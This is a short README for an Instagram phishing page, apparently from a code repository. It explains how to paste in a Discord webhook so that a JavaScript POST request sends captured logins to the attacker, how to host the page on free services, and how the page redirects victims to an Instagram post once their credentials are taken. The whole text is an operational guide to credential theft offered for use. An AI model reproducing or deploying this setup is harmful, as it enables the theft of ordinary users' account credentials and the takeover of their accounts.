# Instagram Phishing Page

Usage :

- My Instagram phishing page is really easy to use, you only have to replace WEBHOOK on line 101 by your Discord webhook
     > request.open("POST", "Webhook");
- Next you upload it in your website (like netlify or 000webhost, they are free)
- When someone will login you will receive his credentials and he will be redirected to a funny video (the one in the link, you can change it by editing the link and the js part in HTML on line 108).
     > window.location.replace("https://instagram.com/p/CR8V_TNF4gW/");
